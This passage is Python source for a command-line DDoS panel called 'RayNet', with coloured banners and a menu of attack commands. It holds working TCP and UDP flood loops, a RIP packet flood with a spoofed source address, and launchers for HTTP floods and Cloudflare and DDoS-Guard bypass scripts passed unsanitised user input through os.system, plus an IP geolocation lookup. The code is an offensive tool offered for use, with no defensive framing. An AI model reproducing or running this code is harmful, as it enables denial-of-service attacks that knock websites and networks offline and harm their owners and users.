           \x1b[38;2;132;231;218m║    \x1b[38;2;255;255;255mdg-bypass  \x1b[38;2;132;231;218m║  \x1b[38;2;255;255;255mBypass Cloudflare Anti-DDoS          \x1b[38;2;132;231;218m║
           \x1b[38;2;132;231;218m║    \x1b[38;2;255;255;255mcf-bypasss \x1b[38;2;132;231;218m║  \x1b[38;2;255;255;255mBypass DDoS-Guard Anti-DDoS          \x1b[38;2;132;231;218m║
           \x1b[38;2;132;231;218m╠═══════════════╩═══════════════════════════════════════╣                    
    ''')

__banner__ = """
                    \x1b[38;2;3;63;125m▄▄▄   ▄▄▄·  ▄· \x1b[38;2;42;162;189m▄▌ ▐ ▄ ▄▄▄ .\x1b[38;2;132;231;218m▄▄▄▄▄
                    \x1b[38;2;3;63;125m▀▄ █·▐█ ▀█ ▐█\x1b[38;2;42;162;189m▪██▌•█▌▐█▀▄.▀\x1b[38;2;132;231;218m·•██  
                    \x1b[38;2;3;63;125m▐▀▀▄ ▄█▀▀█ \x1b[38;2;42;162;189m▐\x1b[38;2;42;162;189m█▌▐█▪▐█▐▐▌▐▀▀\x1b[38;2;132;231;218m▪▄ ▐█.▪
                    \x1b[38;2;3;63;125m▐█•█▌▐█ ▪\x1b[38;2;42;162;189m▐▌ ▐█▀·.██▐█▌▐█\x1b[38;2;132;231;218m▄▄▌ ▐█▌·
                    \x1b[38;2;3;63;125m.▀  ▀ ▀  \x1b[38;2;42;162;189m▀   ▀ • ▀▀ █▪ \x1b[38;2;132;231;218m▀▀▀  ▀▀▀ 𝑽𝟏"""
                
def menu():
    print(f'''
        \x1b[38;2;132;231;218m╔═════════════════════════════════════════════════════════╗
        \x1b[38;2;132;231;218m║\x1b[38;2;0;208;6m- - - - - - \x1b[38;2;255;255;255mWelcome to RayNet Free DDoS Panel \x1b[38;2;0;208;6m- - - - - -\x1b[38;2;132;231;218m║
        \x1b[38;2;132;231;218m║ \x1b[38;2;0;208;6m- - - - - - \x1b[38;2;255;255;255mTo see the commands type "help" \x1b[38;2;0;208;6m- - - - - - \x1b[38;2;132;231;218m║
        \x1b[38;2;132;231;218m╚═════════════════════════════════════════════════════════╝
                            \x1b[38;2;255;255;255m{today}
    ''')

def main():
    clear()
    print(__banner__)
    menu()
    print("""\x1b[38;2;132;231;218m┌──(\x1b[38;2;3;63;125mGhost@root\x1b[38;2;132;231;218m)──[\x1b[38;2;42;162;189m/\x1b[38;2;24;217;170mRoot\x1b[38;2;42;162;189m/\x1b[38;2;24;217;170mRayNet1\x1b[38;2;132;231;218m]
\x1b[38;2;132;231;218m└───\x1b[38;2;255;111;79m➣ \x1b[38;2;194;255;248mLicense: Valid!""")
    print("")
    while True:
        ray = input("""\x1b[38;2;132;231;218m┌──(\x1b[38;2;3;63;125mGhost@root\x1b[38;2;132;231;218m)──[\x1b[38;2;42;162;189m/\x1b[38;2;24;217;170mRoot\x1b[38;2;42;162;189m/\x1b[38;2;24;217;170mRayNet1\x1b[38;2;132;231;218m]
\x1b[38;2;132;231;218m└───\x1b[38;2;255;111;79m➣ \x1b[38;2;194;255;248m""")
        if ray == 'tools':
            tools()
        elif ray == 'layer4' or ray == 'l4':
            layer4()
        elif ray == 'layer7' or ray == 'l7':
            layer7()
        elif ray == 'best':
            best()
        elif ray == 'all':
            tools()
            layer4()
            layer7()
            best()
        elif ray == 'mh-get':
            clear()
            print(__banner__)
            menu()
            print("\x1b[38;2;3;63;125m⮞ \x1b[38;2;255;255;255mmh-get   \x1b[38;2;132;231;218mVery Strong HTTP-GET Attack to Websites")
            print("")
            target = input("\x1b[38;2;3;63;125m⮞ URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m⮞ THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m⮞ MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m⮞ TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m⮞ CTRL + C To Stop")
            os.system(f"python3 start.py get {target} 1 {threads} http.txt {multi} {timeout}")
            main()
        elif ray == 'mh-post':
            clear()
            print(__banner__)
            menu()
            print("\x1b[38;2;3;63;125m⮞ \x1b[38;2;255;255;255mmh-post   \x1b[38;2;132;231;218mVery Strong HTTP-POST Attack to Websites")
            print("")
            target = input("\x1b[38;2;3;63;125m⮞ URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m⮞ THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m⮞ MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m⮞ TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m⮞ CTRL + C To Stop")
            os.system(f"python3 start.py post {target} 1 {threads} http.txt {multi} {timeout}")
            main()
        elif ray == 'mh-head':
            clear()
            print(__banner__)
            menu()
            print("\x1b[38;2;3;63;125m⮞ \x1b[38;2;255;255;255mmh-head   \x1b[38;2;132;231;218mVery Strong HTTP-HEAD Attack to Websites")
            print("")
            target = input("\x1b[38;2;3;63;125m⮞ URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m⮞ THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m⮞ MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m⮞ TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m⮞ CTRL + C To Stop")
            os.system(f"python3 start.py head {target} 1 {threads} http.txt {multi} {timeout}")
            main()
        elif ray == 'mh-bypass':
            clear()
            print(__banner__)
            menu()
            print("\x1b[38;2;3;63;125m⮞ \x1b[38;2;255;255;255mmh-bypass   \x1b[38;2;132;231;218mSimple method to Bypass Normal Anti-DDOS")
            print("")
            target = input("\x1b[38;2;3;63;125m⮞ URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m⮞ THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m⮞ MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m⮞ TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m⮞ CTRL + C To Stop")
            os.system(f"python3 start.py bypass {target} 1 {threads} http.txt {multi} {timeout}")
            main()
        elif ray == 'http-raw':
            clear()
            print(__banner__)
            menu()
            print("\x1b[38;2;3;63;125m⮞ \x1b[38;2;255;255;255mhttp-raw   \x1b[38;2;132;231;218mSend 1 very powerful package to website.")
            print("")
            target = input("\x1b[38;2;3;63;125m⮞ URL:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m⮞ TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m⮞ CTRL + C To Stop or wait for the attack to end")
            os.system(f"node HTTP-RAW.js {target} {timeout}")
            main()
        elif ray == 'cf-bypass':
            clear()
            print(__banner__)
            menu()
            print("\x1b[38;2;3;63;125m⮞ \x1b[38;2;255;255;255mcf-bypass   \x1b[38;2;132;231;218mBest method to Bypass Cloudflare")
            print("")
            target = input("\x1b[38;2;3;63;125m⮞ URL:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m⮞ TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m⮞ CTRL + C To Stop")
            try:
                os.system(f"node cf.js {target} {timeout}")
            except:
                print("Attack Error!")
            main()
        elif ray == 'dg-bypass':
            clear()
            print(__banner__)
            menu()
            print("\x1b[38;2;3;63;125m⮞ \x1b[38;2;255;255;255mdg-bypass   \x1b[38;2;132;231;218mBest method to Bypass DDoS-Guard")
            print("")
            target = input("\x1b[38;2;3;63;125m⮞ URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m⮞ THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m⮞ MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m⮞ TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m⮞ CTRL + C To Stop")
            os.system(f"python3 start.py dgb {target} 1 {threads} http.txt {multi} {timeout}")
            main()
        elif ray == 'tcp':
            clear()
            print(__banner__)
            menu()
            print("\x1b[38;2;3;63;125m⮞ \x1b[38;2;255;255;255mtcp   \x1b[38;2;132;231;218mSend many TCP packets per second to IP")
            print("")
            target = input("\x1b[38;2;3;63;125m⮞ IP:\x1b[38;2;194;255;248m")
            port = input("\x1b[38;2;3;63;125m⮞ PORT:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m⮞ TIME:\x1b[38;2;194;255;248m")
            packets = input("\x1b[38;2;3;63;125m⮞ PACKETS:\x1b[38;2;194;255;248m")
            size = input("\x1b[38;2;3;63;125m⮞ SIZE (BYTES):\x1b[38;2;194;255;248m")

            times = int(time.time()) + int(timeout)

            data = random._urandom(int(size))

            while time.time() < times:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(target), int(port)))
                    for _ in range(int(packets)):
                        s.send(data)
                except:
                    s.close()
            main()

        elif ray == 'udp':
            clear()
            print(__banner__)
            menu()
            print("\x1b[38;2;3;63;125m⮞ \x1b[38;2;255;255;255mudp   \x1b[38;2;132;231;218mSend many UDP packets per second to IP")
            print("")
            target = input("\x1b[38;2;3;63;125m⮞ IP:\x1b[38;2;194;255;248m")
            port = input("\x1b[38;2;3;63;125m⮞ PORT:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m⮞ TIME:\x1b[38;2;194;255;248m")
            packets = input("\x1b[38;2;3;63;125m⮞ PACKETS:\x1b[38;2;194;255;248m")
            size = input("\x1b[38;2;3;63;125m⮞ SIZE (BYTES):\x1b[38;2;194;255;248m")

            times = int(time.time()) + int(timeout)

            data = random._urandom(int(size))

            while time.time() < times:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    for _ in range(int(packets)):
                        s.sendto(data, (str(target), int(port)))
                except:
                    s.close()
            main()

        elif ray == 'rip':
            clear()
            print(__banner__)
            menu()
            print("\x1b[38;2;3;63;125m⮞ \x1b[38;2;255;255;255mrip   \x1b[38;2;132;231;218mSend many RIP packets per second to IP")
            print("")
            target = input("\x1b[38;2;3;63;125m⮞ IP:\x1b[38;2;194;255;248m")
            port = input("\x1b[38;2;3;63;125m⮞ PORT (520 = RIP):\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m⮞ TIME:\x1b[38;2;194;255;248m")
            packets = input("\x1b[38;2;3;63;125m⮞ PACKETS:\x1b[38;2;194;255;248m")

            times = int(time.time()) + int(timeout)

            data = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10"

            while time.time() < times:
                try:
                    packet = (
                    IP(src=target)
                    / UDP(dport=int(port))
                    / Raw(load=data))
                    for _ in range(int(packets)):
                        send(packet, count=int(packets), verbose=False)
                except:
                    s.close()
            main()
        
        elif 'status' in ray:
            try:
                web = ray.split()[1]
                try:
                    r = requests.get(f'{web}')
                    print("Status code: "+str(r.status_code))
                except:
                    print("An error has occurred or the page is down")
            except IndexError:
                print('''Usage: status <website>''')

        elif 'lookup' in ray:
            print("")
            try:
                target = ray.split()[1]
                try:
                    r = requests.post("http://ip-api.com/batch?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy", json=[
                        {"query": f'{target}'
                        }]).json()
                except:
                    print("An error has occurred")
                try:
                    for info in r:
                        print('Status            : '+info["status"])
                        print('Country           : '+info["country"])
                        print("Country Code      : "+info["countryCode"])
                        print("Region/State      : "+info["region"])
                        print("Region/State Name : "+info["regionName"])
                        print("City              : "+info["city"])
                        print("Zip Code          : "+info["zip"])
                        print("Latitude          : "+str(info["lat"]))
                        print("Longitude         : "+str(info["lon"]))
                        print("Timezone          : "+info["timezone"])
                        print("ISP               : "+info["isp"])
                        print("Org               : "+info["org"])
                        print("As                : "+info["as"])
                        print("Mobile            : "+str(info["mobile"]))
                        print("Proxy             : "+str(info["proxy"]))
                        print("")
                except:
                    print("Error")
            except IndexError:
                print("Usage: lookup <ip>")

        elif ray == 'clear':
            main()

        elif ray == 'exit' or ray == 'bye':
            print("Bye!")
            time.sleep(1)
            sys.exit()

        elif ray == 'help':
            print(f'''
layer7: Layer 7 DDoS Methods
layer4: Layer 4 DoS Methods
best: Best bypass's (DG & CF)
tools: See the RayNet tools
clear: Clear the console
exit: Exit RayNet
            ''')

        #elif ray == 'goat-bypass':
            #clear()
            #print(__banner__)
            #menu()
            #print("\x1b[38;2;3;63;125m⮞ \x1b[38;2;255;255;255mgoat-bypass   \x1b[38;2;132;231;218mBest bypass & website flooder in RayNet")
            #print("")
            #target = input("\x1b[38;2;3;63;125m⮞ URL:\x1b[38;2;194;255;248m")
            #timeout = input("\x1b[38;2;3;63;125m⮞ TIME:\x1b[38;2;194;255;248m")
            #requests = input("\x1b[38;2;3;63;125m⮞ REQUESTS:\x1b[38;2;194;255;248m")
            #print("\x1b[38;2;3;63;125m⮞ CTRL + C To Stop")
            #os.system(f"node method.js {target} {timeout} request {requests}")
            #main()
            

main()
